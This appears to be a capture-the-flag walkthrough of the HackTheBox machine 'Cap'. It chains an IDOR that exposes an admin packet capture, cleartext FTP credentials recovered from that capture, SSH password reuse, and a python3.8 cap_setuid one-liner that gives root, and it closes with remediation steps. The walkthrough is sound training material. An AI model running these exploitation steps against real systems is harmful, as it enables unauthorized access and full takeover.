# Cap — Hands-On Walkthrough (the *decision tree*, not the happy path)

> **Box:** Cap · easy · Linux (Ubuntu 20.04)
> **IP:** `$TARGET` (HTB VPN-assigned; substitute yours). Attacker VPN IP = `$ATTACKER_IP`.
> **Final chain:** `web IDOR /download/<id> → admin PCAP with cleartext FTP creds → SSH reuse → user →
> cap_setuid on /usr/bin/python3.8 → setuid(0) → root`
>
> Written as *"here are your options; here's what's a trap and what's the way."* After each command there's
> a **✅ Expected** block showing roughly what you should see — if yours differs, fix that before moving on.
> The clean/formal version is `REPORT.md`; the full evidence trail is `GLOBAL_CONTEXT.md`.

### ⚠️ Three gotchas that cause most "it's not working"
1. **One VPN tunnel, your current tun0 IP.** `ip -br a | grep tun` — if you see `tun0` *and* `tun1` both on
   your IP, return traffic splits and the box reads flaky/down. Kill all openvpn, bring up exactly one.
   (This literally bit us on Cap — 0% connects until the dupe was killed.)
2. **HTB blocks ICMP.** A failing `ping` proves nothing. Test reachability with a TCP connect:
   ```bash
   for p in 21 22 80; do (echo > /dev/tcp/$TARGET/$p) 2>/dev/null && echo "$p open"; done
   ```
3. **Substitute `$TARGET` everywhere** with your current spawn IP (it rotates per respawn).

---

## Phase 1 — Recon: map the surface

```bash
mkdir -p nmap web loot
nmap -p- --min-rate 2000 -oN nmap/allports.txt $TARGET          # full TCP sweep first
nmap -sCV -p21,22,80 -oN nmap/services.txt $TARGET              # service/script scan on what's open
```
> **✅ Expected:** exactly three ports —
> ```
> 21/tcp  open  ftp   vsftpd 3.0.3
> 22/tcp  open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu 20.04)
> 80/tcp  open  http  Gunicorn   (serving a Python/Flask "Security Dashboard")
> ```
> The `80` banner is **Gunicorn**, not nginx/Apache — that's the tell it's a Python app (Flask behind
> Gunicorn), which matters later (the whole app logic, incl. the IDOR, is custom Python).

### Junction — three services, which first?
| Option | Verdict | Why |
|---|---|---|
| **FTP (21)** | quick check then park | Try anonymous once (below). It won't log you in, and never blind-brute. |
| **SSH (22)** | park | No creds yet. Come back the moment recon leaks a password. |
| **Web (80)** | **pursue** | The only unauthenticated thing you can *interact* with — and it ends up handing you creds. |

Anonymous FTP check (one attempt, then move on — this is not the way in):
```bash
curl -s --max-time 10 ftp://$TARGET/ -u anonymous:anonymous ; echo "exit=$?"
```
> **✅ Expected:** login fails / no listing (`530` or non-zero exit). FTP is *relevant later* (it's the
> protocol whose creds we steal), but not an entry point by itself.

---

## Phase 2 — The "Security Dashboard" and its IDOR

Browse the app. It's a Flask dashboard that runs short **per-session packet captures** and exposes:
`/capture` (start a capture bound to *your* session id), report pages at `/data/<id>`, and the raw PCAP at
`/download/<id>`.

```bash
curl -s http://$TARGET/ -o web/index.html                      # the dashboard home
curl -s -o web/data0.html  -w 'data/0   -> %{http_code}\n' http://$TARGET/data/0
curl -s -o /dev/null        -w 'data/1   -> %{http_code}\n' http://$TARGET/data/1
curl -s -o /dev/null        -w 'data/999 -> %{http_code}\n' http://$TARGET/data/999
```
> **✅ Expected:**
> ```
> data/0   -> 200
> data/1   -> 200
> data/999 -> 200 (or a graceful empty report)
> ```
> You never visited `/capture` to create ids 0 or 1 — yet you can read them. The `<id>` is **user-controlled
> and unauthenticated**: classic **IDOR** (Insecure Direct Object Reference). Each `/data/<id>` page links to
> a downloadable PCAP at `/download/<id>`.

### Junction — which id is worth grabbing, and why a PCAP?
- **Why id `0`:** ids count up as users create captures; `0` is the *earliest* capture on the box — typically
  an admin/first-run one, most likely to contain something juicy.
- **Why a PCAP matters:** a packet capture records raw traffic. Port 21 (FTP) is open and **plaintext** — if
  the admin's capture caught an FTP login, the password is sitting in the bytes in the clear.

---

## Phase 3 — Loot capture 0 → cleartext FTP creds

```bash
curl -s http://$TARGET/download/0 -o loot/0.pcap
file loot/0.pcap                                               # confirm it's a pcap, not an HTML error
```
> **✅ Expected:** `loot/0.pcap: pcap capture file ...` (a real capture, a few KB). If instead you got HTML,
> the download id was wrong or the app errored — recheck the URL.

Extract the FTP credentials — three equivalent ways (use whichever you have):
```bash
# a) tshark — pull the FTP command/arg fields directly
tshark -r loot/0.pcap -Y ftp -T fields -e ftp.request.command -e ftp.request.arg

# b) no tshark? raw strings still work for cleartext protocols
strings loot/0.pcap | grep -iE 'USER |PASS '

# c) GUI: wireshark loot/0.pcap -> right-click an FTP packet -> Follow > TCP Stream
```
> **✅ Expected:** the FTP login in cleartext —
> ```
> USER nathan
> PASS Buck3tH4TF0RM3!
> ```
> **Teaching point:** this is *why* plaintext protocols are dangerous on a monitored network — the
> credential never needed cracking; it was transmitted in the open and the capture handed it to us.

---

## Phase 4 — Foothold: credential reuse → SSH (user.txt)

### Junction — where do `nathan:Buck3tH4TF0RM3!` work?
They work on FTP (expected — that's where they were captured), but FTP gives you a file area, not a shell.
The real move is **credential reuse on SSH** (people reuse passwords across services):
```bash
ssh nathan@$TARGET            # password: Buck3tH4TF0RM3!
id                            # on success
cat ~/user.txt
```
> **✅ Expected:**
> ```
> uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
> ```
> plus the 32-hex flag. 🚩 **user.txt captured.** (If SSH rejects the password, re-extract from the PCAP —
> you may have grabbed a truncated value.)

---

## Phase 5 — Privilege escalation: nathan → root

**Work a checklist, not a hunch.** Here's the tiered walk — *what you check* and *what it returns on Cap*.
Most are dead ends; knowing they're dead is what points you at the real one.

| # | Check | Command | Result on Cap | Verdict |
|---|---|---|---|---|
| 1 | **sudo** | `sudo -n -l` | password required / nothing useful | ❌ |
| 2 | **SUID** | `find / -perm -4000 -type f 2>/dev/null` | only distro-standard (su, mount, passwd…) | ❌ |
| 3 | **Capabilities** | `/usr/sbin/getcap -r / 2>/dev/null` | **`/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`** | ✅ **the way** |
| 4 | Cron | `cat /etc/crontab; ls -la /etc/cron.*` | stock jobs only | ❌ |
| 5 | Writable sensitive | `ls -l /etc/passwd /etc/shadow` | root-owned, not writable | ❌ |

The win is **tier 3 — Linux capabilities**, which people often skip after SUID:
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
> **✅ Expected:**
> ```
> /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
> ```

**Why this works (one paragraph):** Linux *file capabilities* grant a binary a specific slice of root power
without the whole SUID-root hammer. `cap_setuid` lets the process call `setuid(2)` to *any* uid — including
0 — with no password. Python is a general-purpose interpreter, so a `cap_setuid`-blessed `python3.8` will
happily run `os.setuid(0)` and then exec a shell that is now really uid 0. (This is a textbook GTFOBins
entry: search "python" on GTFOBins → Capabilities.)

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id                            # in the new shell
cat /root/root.txt
```
> **✅ Expected:**
> ```
> uid=0(root) gid=1001(nathan) groups=1001(nathan)
> ```
> (euid/uid 0 = root) → 🚩 **root.txt captured. Box owned.**
> ⚠️ **Gotcha:** only `cap_setuid` is present, **not** `cap_setgid`. So `os.setgid(0)` throws
> `OperationNotPermitted` — don't include it; `os.setuid(0)` alone is enough.

---

## The whole thing on one page

```
21 ftp (vsftpd) · 22 ssh · 80 http (Gunicorn "Security Dashboard")
   └─ FTP anon ✗   SSH no-creds ✗
   └─ web: /data/<id> + /download/<id>  ── IDOR (unauth, any id)
        └─ /download/0  → admin PCAP  ── tshark/strings → cleartext FTP: nathan : Buck3tH4TF0RM3!
             └─ SSH credential reuse → USER (nathan, uid 1001) · user.txt
                  └─ privesc tiers: sudo✗ SUID✗ cron✗ writable✗
                       └─ getcap: /usr/bin/python3.8 cap_setuid  → os.setuid(0) → ROOT · root.txt
```

## Remediation (for the report side)
1. **IDOR:** enforce authorization on `/data/<id>` & `/download/<id>` — bind each capture to the
   authenticated session/user and reject ids the caller doesn't own.
2. **Cleartext FTP:** disable plaintext FTP; use FTPS/SFTP so credentials can't be sniffed/captured.
3. **Capabilities:** `setcap -r /usr/bin/python3.8`; never grant `cap_setuid` to a general-purpose
   interpreter.
4. **Credential hygiene:** rotate nathan's password and don't reuse FTP creds for SSH.

## Cleanup (artifacts this walkthrough leaves on the box)
None persistent — root was obtained in-memory via the existing `python3.8` capability (no files dropped,
no accounts added). Just close your sessions. (Locally, `loot/0.pcap` holds the recovered creds — keep it
out of git.)
